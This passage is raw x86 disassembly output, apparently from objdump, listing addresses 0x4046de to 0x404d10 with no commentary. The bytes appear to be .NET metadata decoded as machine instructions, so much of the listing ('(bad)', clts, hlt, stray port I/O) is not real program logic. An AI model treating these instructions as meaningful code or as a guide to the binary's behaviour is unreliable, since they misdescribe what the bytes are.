  4046de:	06                   	push   %es
  4046df:	00 7f 10             	add    %bh,0x10(%edi)
  4046e2:	56                   	push   %esi
  4046e3:	01 06                	add    %eax,(%esi)
  4046e5:	00 61 0d             	add    %ah,0xd(%ecx)
  4046e8:	56                   	push   %esi
  4046e9:	01 06                	add    %eax,(%esi)
  4046eb:	00 5b 0a             	add    %bl,0xa(%ebx)
  4046ee:	bd 09 06 00 e5       	mov    $0xe5000609,%ebp
  4046f3:	08 b8 0d 16 00 16    	or     %bh,0x1600160d(%eax)
  4046f9:	03 28                	add    (%eax),%ebp
  4046fb:	0b 06                	or     (%esi),%eax
  4046fd:	00 75 00             	add    %dh,0x0(%ebp)
  404700:	99                   	cltd
  404701:	01 06                	add    %eax,(%esi)
  404703:	00 ba 00 bd 09 12    	add    %bh,0x1209bd00(%edx)
  404709:	00 d7                	add    %dl,%bh
  40470b:	02 1e                	add    (%esi),%bl
  40470d:	08 12                	or     %dl,(%edx)
  40470f:	00 34 0c             	add    %dh,(%esp,%ecx,1)
  404712:	1e                   	push   %ds
  404713:	08 12                	or     %dl,(%edx)
  404715:	00 9e 0e c0 07 06    	add    %bl,0x607c00e(%esi)
  40471b:	00 b3 00 bd 09 0a    	add    %dh,0xa09bd00(%ebx)
  404721:	00 4e 09             	add    %cl,0x9(%esi)
  404724:	e3 0d                	jecxz  0x404733
  404726:	12 00                	adc    (%eax),%al
  404728:	40                   	inc    %eax
  404729:	0f 1e 08             	nopl   (%eax)
  40472c:	12 00                	adc    (%eax),%al
  40472e:	97                   	xchg   %eax,%edi
  40472f:	03 1e                	add    (%esi),%ebx
  404731:	08 12                	or     %dl,(%edx)
  404733:	00 13                	add    %dl,(%ebx)
  404735:	0f 1e 08             	nopl   (%eax)
  404738:	0a 00                	or     (%eax),%al
  40473a:	79 03                	jns    0x40473f
  40473c:	e3 0d                	jecxz  0x40474b
  40473e:	2b 01                	sub    (%ecx),%eax
  404740:	74 0a                	je     0x40474c
  404742:	00 00                	add    %al,(%eax)
  404744:	0a 00                	or     (%eax),%al
  404746:	fc                   	cld
  404747:	0e                   	push   %cs
  404748:	e3 0d                	jecxz  0x404757
  40474a:	06                   	push   %es
  40474b:	00 a6 09 bd 09 0a    	add    %ah,0xa09bd09(%esi)
  404751:	00 fb                	add    %bh,%bl
  404753:	09 e3                	or     %esp,%ebx
  404755:	0d 12 00 90 07       	or     $0x7900012,%eax
  40475a:	1e                   	push   %ds
  40475b:	08 06                	or     %al,(%esi)
  40475d:	00 d7                	add    %dl,%bh
  40475f:	00 bd 09 0e 00 86    	add    %bh,-0x79fff1f7(%ebp)
  404765:	0a b8 0e 0e 00 7f    	or     0x7f000e0e(%eax),%bh
  40476b:	0b b8 0e 06 00 b7    	or     -0x48fff9f2(%eax),%edi
  404771:	07                   	pop    %es
  404772:	96                   	xchg   %eax,%esi
  404773:	0f 06                	clts
  404775:	00 5c 09 56          	add    %bl,0x56(%ecx,%ecx,1)
  404779:	01 0e                	add    %ecx,(%esi)
  40477b:	00 b1 03 69 0c 06    	add    %dh,0x60c6903(%ecx)
  404781:	00 71 03             	add    %dh,0x3(%ecx)
  404784:	bd 09 06 00 3b       	mov    $0x3b000609,%ebp
  404789:	04 bd                	add    $0xbd,%al
  40478b:	09 06                	or     %eax,(%esi)
  40478d:	00 2d 03 bd 09 06    	add    %ch,0x609bd03
  404793:	00 71 10             	add    %dh,0x10(%ecx)
  404796:	62 0a                	bound  %ecx,(%edx)
  404798:	0e                   	push   %cs
  404799:	00 9f 04 2f 0a 00    	add    %bl,0xa2f04(%edi)
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	00 e1                	add    %ah,%cl
  4047a3:	00 00                	add    %al,(%eax)
  4047a5:	00 00                	add    %al,(%eax)
  4047a7:	00 01                	add    %al,(%ecx)
  4047a9:	00 01                	add    %al,(%ecx)
  4047ab:	00 00                	add    %al,(%eax)
  4047ad:	01 10                	add    %edx,(%eax)
  4047af:	00 c1                	add    %al,%cl
  4047b1:	00 00                	add    %al,(%eax)
  4047b3:	00 49 00             	add    %cl,0x0(%ecx)
  4047b6:	01 00                	add    %eax,(%eax)
  4047b8:	01 00                	add    %eax,(%eax)
  4047ba:	80 01 10             	addb   $0x10,(%ecx)
  4047bd:	00 95 09 7c 0e 49    	add    %dl,0x490e7c09(%ebp)
  4047c3:	00 04 00             	add    %al,(%eax,%eax,1)
  4047c6:	08 00                	or     %al,(%eax)
  4047c8:	01 00                	add    %eax,(%eax)
  4047ca:	10 00                	adc    %al,(%eax)
  4047cc:	9d                   	popf
  4047cd:	00 40 04             	add    %al,0x4(%eax)
  4047d0:	61                   	popa
  4047d1:	00 05 00 0c 00 00    	add    %al,0xc00
  4047d7:	00 10                	add    %dl,(%eax)
  4047d9:	00 df                	add    %bl,%bh
  4047db:	0c 38                	or     $0x38,%al
  4047dd:	0d 49 00 0d 00       	or     $0xd0049,%eax
  4047e2:	38 00                	cmp    %al,(%eax)
  4047e4:	00 01                	add    %al,(%ecx)
  4047e6:	10 00                	adc    %al,(%eax)
  4047e8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4047e9:	0d 38 0d c5 00       	or     $0xc50d38,%eax
  4047ee:	0f 00                	(bad)
  4047f0:	3c 00                	cmp    $0x0,%al
  4047f2:	03 21                	add    (%ecx),%esp
  4047f4:	10 00                	adc    %al,(%eax)
  4047f6:	95                   	xchg   %eax,%ebp
  4047f7:	01 00                	add    %eax,(%eax)
  4047f9:	00 49 00             	add    %cl,0x0(%ecx)
  4047fc:	10 00                	adc    %al,(%eax)
  4047fe:	3f                   	aas
  4047ff:	00 21                	add    %ah,(%ecx)
  404801:	00 fa                	add    %bh,%dl
  404803:	01 38                	add    %edi,(%eax)
  404805:	00 21                	add    %ah,(%ecx)
  404807:	00 21                	add    %ah,(%ecx)
  404809:	02 3c 00             	add    (%eax,%eax,1),%bh
  40480c:	21 00                	and    %eax,(%eax)
  40480e:	0c 02                	or     $0x2,%al
  404810:	40                   	inc    %eax
  404811:	00 51 80             	add    %dl,-0x80(%ecx)
  404814:	11 01                	adc    %eax,(%ecx)
  404816:	f4                   	hlt
  404817:	04 51                	add    $0x51,%al
  404819:	80 6c 01 f7 04       	subb   $0x4,-0x9(%ecx,%eax,1)
  40481e:	51                   	push   %ecx
  40481f:	80 2f 01             	subb   $0x1,(%edi)
  404822:	f7 04 51 80 19 01 f7 	testl  $0xf7011980,(%ecx,%edx,2)
  404829:	04 51                	add    $0x51,%al
  40482b:	80 4c 01 91 02       	orb    $0x2,-0x6f(%ecx,%eax,1)
  404830:	51                   	push   %ecx
  404831:	80 09 01             	orb    $0x1,(%ecx)
  404834:	91                   	xchg   %eax,%ecx
  404835:	02 01                	add    (%ecx),%al
  404837:	00 4c 02 fa          	add    %cl,-0x6(%edx,%eax,1)
  40483b:	04 01                	add    $0x1,%al
  40483d:	00 54 08 91          	add    %dl,-0x6f(%eax,%ecx,1)
  404841:	02 01                	add    (%ecx),%al
  404843:	00 ed                	add    %ch,%ch
  404845:	03 91 02 11 00 d5    	add    -0x2affeefe(%ecx),%edx
  40484b:	09 fe                	or     %edi,%esi
  40484d:	04 11                	add    $0x11,%al
  40484f:	00 84 04 03 05 11 00 	add    %al,0x110503(%esp,%eax,1)
  404856:	89 02                	mov    %eax,(%edx)
  404858:	08 05 36 00 dd 00    	or     %al,0xdd0036
  40485e:	0c 05                	or     $0x5,%al
  404860:	16                   	push   %ss
  404861:	00 16                	add    %dl,(%esi)
  404863:	00 10                	add    %dl,(%eax)
  404865:	05 50 20 00 00       	add    $0x2050,%eax
  40486a:	00 00                	add    %al,(%eax)
  40486c:	86 08                	xchg   %cl,(%eax)
  40486e:	e6 01                	out    %al,$0x1
  404870:	2a 02                	sub    (%edx),%al
  404872:	01 00                	add    %eax,(%eax)
  404874:	58                   	pop    %eax
  404875:	20 00                	and    %al,(%eax)
  404877:	00 00                	add    %al,(%eax)
  404879:	00 86 08 d2 0f 15    	add    %al,0x150fd208(%esi)
  40487f:	05 01 00 60 20       	add    $0x20600001,%eax
  404884:	00 00                	add    %al,(%eax)
  404886:	00 00                	add    %al,(%eax)
  404888:	86 08                	xchg   %cl,(%eax)
  40488a:	b3 02                	mov    $0x2,%bl
  40488c:	1a 05 01 00 68 20    	sbb    0x20680001,%al
  404892:	00 00                	add    %al,(%eax)
  404894:	00 00                	add    %al,(%eax)
  404896:	86 18                	xchg   %bl,(%eax)
  404898:	53                   	push   %ebx
  404899:	0c 8f                	or     $0x8f,%al
  40489b:	03 01                	add    (%ecx),%eax
  40489d:	00 88 20 00 00 00    	add    %cl,0x20(%eax)
  4048a3:	00 c6                	add    %al,%dh
  4048a5:	00 cf                	add    %cl,%bh
  4048a7:	0d 1f 05 04 00       	or     $0x4051f,%eax
  4048ac:	f0 20 00             	lock and %al,(%eax)
  4048af:	00 00                	add    %al,(%eax)
  4048b1:	00 c6                	add    %al,%dh
  4048b3:	00 99 02 5f 03 05    	add    %bl,0x5035f02(%ecx)
  4048b9:	00 48 21             	add    %cl,0x21(%eax)
  4048bc:	00 00                	add    %al,(%eax)
  4048be:	00 00                	add    %al,(%eax)
  4048c0:	c6 00 15             	movb   $0x15,(%eax)
  4048c3:	08 8d 00 05 00 00    	or     %cl,0x500(%ebp)
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	00 80 00 91 20 e3    	add    %al,-0x1cdf6f00(%eax)
  4048d1:	0f 24 05             	mov    %tr0,%ebp
  4048d4:	05 00 00 00 00       	add    $0x0,%eax
  4048d9:	00 80 00 91 20 07    	add    %al,0x7209100(%eax)
  4048df:	10 28                	adc    %ch,(%eax)
  4048e1:	05 05 00 e0 21       	add    $0x21e00005,%eax
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	00 00                	add    %al,(%eax)
  4048ea:	91                   	xchg   %eax,%ecx
  4048eb:	00 10                	add    %dl,(%eax)
  4048ed:	0a a9 00 07 00 38    	or     0x38000700(%ecx),%ch
  4048f3:	22 00                	and    (%eax),%al
  4048f5:	00 00                	add    %al,(%eax)
  4048f7:	00 91 00 a4 0a 2e    	add    %dl,0x2e0aa400(%ecx)
  4048fd:	05 07 00 00 00       	add    $0x7,%eax
  404902:	00 00                	add    %al,(%eax)
  404904:	80 00 91             	addb   $0x91,(%eax)
  404907:	20 82 0f 32 05 07    	and    %al,0x705320f(%edx)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	00 00                	add    %al,(%eax)
  404911:	00 80 00 91 20 3a    	add    %al,0x3a209100(%eax)
  404917:	0c 37                	or     $0x37,%al
  404919:	05 08 00 00 00       	add    $0x8,%eax
  40491e:	00 00                	add    %al,(%eax)
  404920:	80 00 91             	addb   $0x91,(%eax)
  404923:	20 2b                	and    %ch,(%ebx)
  404925:	0e                   	push   %cs
  404926:	3c 05                	cmp    $0x5,%al
  404928:	09 00                	or     %eax,(%eax)
  40492a:	00 00                	add    %al,(%eax)
  40492c:	00 00                	add    %al,(%eax)
  40492e:	80 00 91             	addb   $0x91,(%eax)
  404931:	20 d8                	and    %bl,%al
  404933:	0a 42 05             	or     0x5(%edx),%al
  404936:	0b 00                	or     (%eax),%eax
  404938:	00 00                	add    %al,(%eax)
  40493a:	00 00                	add    %al,(%eax)
  40493c:	80 00 91             	addb   $0x91,(%eax)
  40493f:	20 05 0b 4a 05 0f    	and    %al,0xf054a0b
  404945:	00 d4                	add    %dl,%ah
  404947:	22 00                	and    (%eax),%al
  404949:	00 00                	add    %al,(%eax)
  40494b:	00 86 18 53 0c 06    	add    %al,0x60c5318(%esi)
  404951:	00 10                	add    %dl,(%eax)
  404953:	00 40 23             	add    %al,0x23(%eax)
  404956:	00 00                	add    %al,(%eax)
  404958:	00 00                	add    %al,(%eax)
  40495a:	86 00                	xchg   %al,(%eax)
  40495c:	b2 0a                	mov    $0xa,%dl
  40495e:	06                   	push   %es
  40495f:	00 10                	add    %dl,(%eax)
  404961:	00 a4 23 00 00 00 00 	add    %ah,0x0(%ebx,%eiz,1)
  404968:	81 00 12 0e 06 00    	addl   $0x60e12,(%eax)
  40496e:	10 00                	adc    %al,(%eax)
  404970:	78 30                	js     0x4049a2
  404972:	00 00                	add    %al,(%eax)
  404974:	00 00                	add    %al,(%eax)
  404976:	81 00 af 0b 10 00    	addl   $0x100baf,(%eax)
  40497c:	10 00                	adc    %al,(%eax)
  40497e:	dc 30                	fdivl  (%eax)
  404980:	00 00                	add    %al,(%eax)
  404982:	00 00                	add    %al,(%eax)
  404984:	81 00 d6 08 06 00    	addl   $0x608d6,(%eax)
  40498a:	11 00                	adc    %eax,(%eax)
  40498c:	80 31 00             	xorb   $0x0,(%ecx)
  40498f:	00 00                	add    %al,(%eax)
  404991:	00 81 00 74 02 06    	add    %al,0x6027400(%ecx)
  404997:	00 11                	add    %dl,(%ecx)
  404999:	00 dc                	add    %bl,%ah
  40499b:	31 00                	xor    %eax,(%eax)
  40499d:	00 00                	add    %al,(%eax)
  40499f:	00 81 00 17 0b 06    	add    %al,0x60b1700(%ecx)
  4049a5:	00 11                	add    %dl,(%ecx)
  4049a7:	00 1c 32             	add    %bl,(%edx,%esi,1)
  4049aa:	00 00                	add    %al,(%eax)
  4049ac:	00 00                	add    %al,(%eax)
  4049ae:	81 00 38 10 06 00    	addl   $0x61038,(%eax)
  4049b4:	11 00                	adc    %eax,(%eax)
  4049b6:	d8 32                	fdivs  (%edx)
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	81 00 5b 0f 06 00    	addl   $0x60f5b,(%eax)
  4049c2:	11 00                	adc    %eax,(%eax)
  4049c4:	80 33 00             	xorb   $0x0,(%ebx)
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	00 86 00 ca 08 06    	add    %al,0x608ca00(%esi)
  4049cf:	00 11                	add    %dl,(%ecx)
  4049d1:	00 98 33 00 00 00    	add    %bl,0x33(%eax)
  4049d7:	00 81 00 fe 00 06    	add    %al,0x600fe00(%ecx)
  4049dd:	00 11                	add    %dl,(%ecx)
  4049df:	00 3c 34             	add    %bh,(%esp,%esi,1)
  4049e2:	00 00                	add    %al,(%eax)
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	81 00 f3 00 06 00    	addl   $0x600f3,(%eax)
  4049ec:	11 00                	adc    %eax,(%eax)
  4049ee:	cc                   	int3
  4049ef:	34 00                	xor    $0x0,%al
  4049f1:	00 00                	add    %al,(%eax)
  4049f3:	00 81 00 b4 04 06    	add    %al,0x604b400(%ecx)
  4049f9:	00 11                	add    %dl,(%ecx)
  4049fb:	00 28                	add    %ch,(%eax)
  4049fd:	35 00 00 00 00       	xor    $0x0,%eax
  404a02:	81 00 b4 01 06 00    	addl   $0x601b4,(%eax)
  404a08:	11 00                	adc    %eax,(%eax)
  404a0a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404a0b:	35 00 00 00 00       	xor    $0x0,%eax
  404a10:	81 00 22 0d 06 00    	addl   $0x60d22,(%eax)
  404a16:	11 00                	adc    %eax,(%eax)
  404a18:	bc 37 00 00 00       	mov    $0x37,%esp
  404a1d:	00 81 00 00 08 4f    	add    %al,0x4f080000(%ecx)
  404a23:	05 11 00 f4 37       	add    $0x37f40011,%eax
  404a28:	00 00                	add    %al,(%eax)
  404a2a:	00 00                	add    %al,(%eax)
  404a2c:	81 00 d7 0b 06 00    	addl   $0x60bd7,(%eax)
  404a32:	12 00                	adc    (%eax),%al
  404a34:	80 38 00             	cmpb   $0x0,(%eax)
  404a37:	00 00                	add    %al,(%eax)
  404a39:	00 81 00 01 03 06    	add    %al,0x6030100(%ecx)
  404a3f:	00 12                	add    %dl,(%edx)
  404a41:	00 e8                	add    %ch,%al
  404a43:	38 00                	cmp    %al,(%eax)
  404a45:	00 00                	add    %al,(%eax)
  404a47:	00 81 00 00 0c 06    	add    %al,0x60c0000(%ecx)
  404a4d:	00 12                	add    %dl,(%edx)
  404a4f:	00 74 39 00          	add    %dh,0x0(%ecx,%edi,1)
  404a53:	00 00                	add    %al,(%eax)
  404a55:	00 81 00 89 10 06    	add    %al,0x6108900(%ecx)
  404a5b:	00 12                	add    %dl,(%edx)
  404a5d:	00 dc                	add    %bl,%ah
  404a5f:	39 00                	cmp    %eax,(%eax)
  404a61:	00 00                	add    %al,(%eax)
  404a63:	00 81 00 33 09 06    	add    %al,0x6093300(%ecx)
  404a69:	00 12                	add    %dl,(%edx)
  404a6b:	00 98 3a 00 00 00    	add    %bl,0x3a(%eax)
  404a71:	00 81 00 a5 02 06    	add    %al,0x602a500(%ecx)
  404a77:	00 12                	add    %dl,(%edx)
  404a79:	00 30                	add    %dh,(%eax)
  404a7b:	3b 00                	cmp    (%eax),%eax
  404a7d:	00 00                	add    %al,(%eax)
  404a7f:	00 81 00 57 04 06    	add    %al,0x6045700(%ecx)
  404a85:	00 12                	add    %dl,(%edx)
  404a87:	00 58 3b             	add    %bl,0x3b(%eax)
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	00 00                	add    %al,(%eax)
  404a8e:	81 00 06 09 06 00    	addl   $0x60906,(%eax)
  404a94:	12 00                	adc    (%eax),%al
  404a96:	c0 3b 00             	sarb   $0x0,(%ebx)
  404a99:	00 00                	add    %al,(%eax)
  404a9b:	00 81 00 ea 00 06    	add    %al,0x600ea00(%ecx)
  404aa1:	00 12                	add    %dl,(%edx)
  404aa3:	00 28                	add    %ch,(%eax)
  404aa5:	3c 00                	cmp    $0x0,%al
  404aa7:	00 00                	add    %al,(%eax)
  404aa9:	00 81 00 01 0e 06    	add    %al,0x60e0100(%ecx)
  404aaf:	00 12                	add    %dl,(%edx)
  404ab1:	00 a4 3c 00 00 00 00 	add    %ah,0x0(%esp,%edi,1)
  404ab8:	81 00 4e 0e 06 00    	addl   $0x60e4e,(%eax)
  404abe:	12 00                	adc    (%eax),%al
  404ac0:	20 3d 00 00 00 00    	and    %bh,0x0
  404ac6:	81 00 e9 02 06 00    	addl   $0x602e9,(%eax)
  404acc:	12 00                	adc    (%eax),%al
  404ace:	e0 3d                	loopne 0x404b0d
  404ad0:	00 00                	add    %al,(%eax)
  404ad2:	00 00                	add    %al,(%eax)
  404ad4:	81 00 c9 0a 06 00    	addl   $0x60ac9,(%eax)
  404ada:	12 00                	adc    (%eax),%al
  404adc:	2c 3e                	sub    $0x3e,%al
  404ade:	00 00                	add    %al,(%eax)
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	81 00 60 01 8d 00    	addl   $0x8d0160,(%eax)
  404ae8:	12 00                	adc    (%eax),%al
  404aea:	88 3e                	mov    %bh,(%esi)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	00 00                	add    %al,(%eax)
  404af0:	81 00 45 0f 06 00    	addl   $0x60f45,(%eax)
  404af6:	12 00                	adc    (%eax),%al
  404af8:	54                   	push   %esp
  404af9:	3f                   	aas
  404afa:	00 00                	add    %al,(%eax)
  404afc:	00 00                	add    %al,(%eax)
  404afe:	81 00 73 09 10 00    	addl   $0x100973,(%eax)
  404b04:	12 00                	adc    (%eax),%al
  404b06:	b4 3f                	mov    $0x3f,%ah
  404b08:	00 00                	add    %al,(%eax)
  404b0a:	00 00                	add    %al,(%eax)
  404b0c:	81 00 82 09 10 00    	addl   $0x100982,(%eax)
  404b12:	13 00                	adc    (%eax),%eax
  404b14:	68 41 00 00 00       	push   $0x41
  404b19:	00 81 00 35 02 10    	add    %al,0x10023500(%ecx)
  404b1f:	00 14 00             	add    %dl,(%eax,%eax,1)
  404b22:	d4 41                	aam    $0x41
  404b24:	00 00                	add    %al,(%eax)
  404b26:	00 00                	add    %al,(%eax)
  404b28:	81 00 5b 03 10 00    	addl   $0x10035b,(%eax)
  404b2e:	15 00 3c 42 00       	adc    $0x423c00,%eax
  404b33:	00 00                	add    %al,(%eax)
  404b35:	00 81 00 b6 09 06    	add    %al,0x609b600(%ecx)
  404b3b:	00 16                	add    %dl,(%esi)
  404b3d:	00 4c 42 00          	add    %cl,0x0(%edx,%eax,2)
  404b41:	00 00                	add    %al,(%eax)
  404b43:	00 81 00 01 00 06    	add    %al,0x6000100(%ecx)
  404b49:	00 16                	add    %dl,(%esi)
  404b4b:	00 04 43             	add    %al,(%ebx,%eax,2)
  404b4e:	00 00                	add    %al,(%eax)
  404b50:	00 00                	add    %al,(%eax)
  404b52:	81 00 3c 00 06 00    	addl   $0x6003c,(%eax)
  404b58:	16                   	push   %ss
  404b59:	00 5f 43             	add    %bl,0x43(%edi)
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	00 00                	add    %al,(%eax)
  404b60:	81 00 57 00 54 05    	addl   $0x5540057,(%eax)
  404b66:	16                   	push   %ss
  404b67:	00 78 43             	add    %bh,0x43(%eax)
  404b6a:	00 00                	add    %al,(%eax)
  404b6c:	00 00                	add    %al,(%eax)
  404b6e:	83 18 53             	sbbl   $0x53,(%eax)
  404b71:	0c 06                	or     $0x6,%al
  404b73:	00 17                	add    %dl,(%edi)
  404b75:	00 84 43 00 00 00 00 	add    %al,0x0(%ebx,%eax,2)
  404b7c:	93                   	xchg   %eax,%ebx
  404b7d:	08 c3                	or     %al,%bl
  404b7f:	0b 59 05             	or     0x5(%ecx),%ebx
  404b82:	17                   	pop    %ss
  404b83:	00 cc                	add    %cl,%ah
  404b85:	43                   	inc    %ebx
  404b86:	00 00                	add    %al,(%eax)
  404b88:	00 00                	add    %al,(%eax)
  404b8a:	93                   	xchg   %eax,%ebx
  404b8b:	08 6c 04 5f          	or     %ch,0x5f(%esp,%eax,1)
  404b8f:	05 17 00 e3 43       	add    $0x43e30017,%eax
  404b94:	00 00                	add    %al,(%eax)
  404b96:	00 00                	add    %al,(%eax)
  404b98:	93                   	xchg   %eax,%ebx
  404b99:	08 78 04             	or     %bh,0x4(%eax)
  404b9c:	65 05 17 00 ec 43    	gs add $0x43ec0017,%eax
  404ba2:	00 00                	add    %al,(%eax)
  404ba4:	00 00                	add    %al,(%eax)
  404ba6:	96                   	xchg   %eax,%esi
  404ba7:	08 ce                	or     %cl,%dh
  404ba9:	0e                   	push   %cs
  404baa:	6c                   	insb   (%dx),%es:(%edi)
  404bab:	05 18 00 03 44       	add    $0x44030018,%eax
  404bb0:	00 00                	add    %al,(%eax)
  404bb2:	00 00                	add    %al,(%eax)
  404bb4:	86 18                	xchg   %bl,(%eax)
  404bb6:	53                   	push   %ebx
  404bb7:	0c 06                	or     $0x6,%al
  404bb9:	00 18                	add    %bl,(%eax)
  404bbb:	00 0c 44             	add    %cl,(%esp,%eax,2)
  404bbe:	00 00                	add    %al,(%eax)
  404bc0:	00 00                	add    %al,(%eax)
  404bc2:	91                   	xchg   %eax,%ecx
  404bc3:	18 59 0c             	sbb    %bl,0xc(%ecx)
  404bc6:	a9 00 18 00 22       	test   $0x22001800,%eax
  404bcb:	44                   	inc    %esp
  404bcc:	00 00                	add    %al,(%eax)
  404bce:	00 00                	add    %al,(%eax)
  404bd0:	91                   	xchg   %eax,%ecx
  404bd1:	18 59 0c             	sbb    %bl,0xc(%ecx)
  404bd4:	a9 00 18 00 2e       	test   $0x2e001800,%eax
  404bd9:	44                   	inc    %esp
  404bda:	00 00                	add    %al,(%eax)
  404bdc:	00 00                	add    %al,(%eax)
  404bde:	86 18                	xchg   %bl,(%eax)
  404be0:	53                   	push   %ebx
  404be1:	0c 06                	or     $0x6,%al
  404be3:	00 18                	add    %bl,(%eax)
  404be5:	00 38                	add    %bh,(%eax)
  404be7:	44                   	inc    %esp
  404be8:	00 00                	add    %al,(%eax)
  404bea:	00 00                	add    %al,(%eax)
  404bec:	83 00 20             	addl   $0x20,(%eax)
  404bef:	00 06                	add    %al,(%esi)
  404bf1:	00 18                	add    %bl,(%eax)
  404bf3:	00 00                	add    %al,(%eax)
  404bf5:	00 01                	add    %al,(%ecx)
  404bf7:	00 ea                	add    %ch,%dl
  404bf9:	01 00                	add    %eax,(%eax)
  404bfb:	00 02                	add    %al,(%edx)
  404bfd:	00 d6                	add    %dl,%dh
  404bff:	0f 00 00             	sldt   (%eax)
  404c02:	03 00                	add    (%eax),%eax
  404c04:	b7 02                	mov    $0x2,%bh
  404c06:	00 00                	add    %al,(%eax)
  404c08:	01 00                	add    %eax,(%eax)
  404c0a:	72 07                	jb     0x404c13
  404c0c:	00 00                	add    %al,(%eax)
  404c0e:	01 00                	add    %eax,(%eax)
  404c10:	30 02                	xor    %al,(%edx)
  404c12:	00 00                	add    %al,(%eax)
  404c14:	02 00                	add    (%eax),%al
  404c16:	18 10                	sbb    %dl,(%eax)
  404c18:	00 00                	add    %al,(%eax)
  404c1a:	01 00                	add    %eax,(%eax)
  404c1c:	87 0e                	xchg   %ecx,(%esi)
  404c1e:	00 00                	add    %al,(%eax)
  404c20:	01 00                	add    %eax,(%eax)
  404c22:	12 10                	adc    (%eax),%dl
  404c24:	00 00                	add    %al,(%eax)
  404c26:	01 00                	add    %eax,(%eax)
  404c28:	2e 10 00             	adc    %al,%cs:(%eax)
  404c2b:	00 02                	add    %al,(%edx)
  404c2d:	00 a1 10 00 00 01    	add    %ah,0x1000010(%ecx)
  404c33:	00 59 0a             	add    %bl,0xa(%ecx)
  404c36:	00 00                	add    %al,(%eax)
  404c38:	02 00                	add    (%eax),%al
  404c3a:	63 09                	arpl   %ecx,(%ecx)
  404c3c:	00 00                	add    %al,(%eax)
  404c3e:	03 00                	add    (%eax),%eax
  404c40:	6b 09 00             	imul   $0x0,(%ecx),%ecx
  404c43:	00 04 00             	add    %al,(%eax,%eax,1)
  404c46:	af                   	scas   %es:(%edi),%eax
  404c47:	08 00                	or     %al,(%eax)
  404c49:	00 01                	add    %al,(%ecx)
  404c4b:	00 3a                	add    %bh,(%edx)
  404c4d:	04 00                	add    $0x0,%al
  404c4f:	00 01                	add    %al,(%ecx)
  404c51:	00 7d 08             	add    %bh,0x8(%ebp)
  404c54:	00 00                	add    %al,(%eax)
  404c56:	01 00                	add    %eax,(%eax)
  404c58:	a8 08                	test   $0x8,%al
  404c5a:	00 00                	add    %al,(%eax)
  404c5c:	01 00                	add    %eax,(%eax)
  404c5e:	f9                   	stc
  404c5f:	02 00                	add    (%eax),%al
  404c61:	00 01                	add    %al,(%ecx)
  404c63:	00 4b 08             	add    %cl,0x8(%ebx)
  404c66:	00 00                	add    %al,(%eax)
  404c68:	01 00                	add    %eax,(%eax)
  404c6a:	44                   	inc    %esp
  404c6b:	02 00                	add    (%eax),%al
  404c6d:	00 01                	add    %al,(%ecx)
  404c6f:	00 88 08 00 00 01    	add    %cl,0x1000008(%eax)
  404c75:	00 85 0e 00 00 01    	add    %al,0x100000e(%ebp)
  404c7b:	00 72 07             	add    %dh,0x7(%edx)
  404c7e:	09 00                	or     %eax,(%eax)
  404c80:	53                   	push   %ebx
  404c81:	0c 01                	or     $0x1,%al
  404c83:	00 11                	add    %dl,(%ecx)
  404c85:	00 53 0c             	add    %dl,0xc(%ebx)
  404c88:	06                   	push   %es
  404c89:	00 19                	add    %bl,(%ecx)
  404c8b:	00 53 0c             	add    %dl,0xc(%ebx)
  404c8e:	0a 00                	or     (%eax),%al
  404c90:	29 00                	sub    %eax,(%eax)
  404c92:	53                   	push   %ebx
  404c93:	0c 10                	or     $0x10,%al
  404c95:	00 31                	add    %dh,(%ecx)
  404c97:	00 53 0c             	add    %dl,0xc(%ebx)
  404c9a:	10 00                	adc    %al,(%eax)
  404c9c:	39 00                	cmp    %eax,(%eax)
  404c9e:	53                   	push   %ebx
  404c9f:	0c 10                	or     $0x10,%al
  404ca1:	00 41 00             	add    %al,0x0(%ecx)
  404ca4:	53                   	push   %ebx
  404ca5:	0c 10                	or     $0x10,%al
  404ca7:	00 49 00             	add    %cl,0x0(%ecx)
  404caa:	53                   	push   %ebx
  404cab:	0c 10                	or     $0x10,%al
  404cad:	00 51 00             	add    %dl,0x0(%ecx)
  404cb0:	53                   	push   %ebx
  404cb1:	0c 10                	or     $0x10,%al
  404cb3:	00 59 00             	add    %bl,0x0(%ecx)
  404cb6:	53                   	push   %ebx
  404cb7:	0c 10                	or     $0x10,%al
  404cb9:	00 61 00             	add    %ah,0x0(%ecx)
  404cbc:	53                   	push   %ebx
  404cbd:	0c 15                	or     $0x15,%al
  404cbf:	00 69 00             	add    %ch,0x0(%ecx)
  404cc2:	53                   	push   %ebx
  404cc3:	0c 10                	or     $0x10,%al
  404cc5:	00 71 00             	add    %dh,0x0(%ecx)
  404cc8:	53                   	push   %ebx
  404cc9:	0c 10                	or     $0x10,%al
  404ccb:	00 79 00             	add    %bh,0x0(%ecx)
  404cce:	53                   	push   %ebx
  404ccf:	0c 10                	or     $0x10,%al
  404cd1:	00 81 00 53 0c 06    	add    %al,0x60c5300(%ecx)
  404cd7:	00 89 00 53 0c 10    	add    %cl,0x100c5300(%ecx)
  404cdd:	00 a1 00 53 0c 1a    	add    %ah,0x1a0c5300(%ecx)
  404ce3:	00 a9 00 53 0c 06    	add    %ch,0x60c5300(%ecx)
  404ce9:	00 b1 00 53 0c 06    	add    %dh,0x60c5300(%ecx)
  404cef:	00 59 01             	add    %bl,0x1(%ecx)
  404cf2:	53                   	push   %ebx
  404cf3:	0c 20                	or     $0x20,%al
  404cf5:	00 61 01             	add    %ah,0x1(%ecx)
  404cf8:	53                   	push   %ebx
  404cf9:	0c 06                	or     $0x6,%al
  404cfb:	00 81 01 53 0c 26    	add    %al,0x260c5301(%ecx)
  404d01:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404d04:	fa                   	cli
  404d05:	01 38                	add    %edi,(%eax)
  404d07:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404d0a:	21 02                	and    %eax,(%edx)
  404d0c:	3c 00                	cmp    $0x0,%al
  404d0e:	0c 00                	or     $0x0,%al
  404d10:	0c 02                	or     $0x2,%al
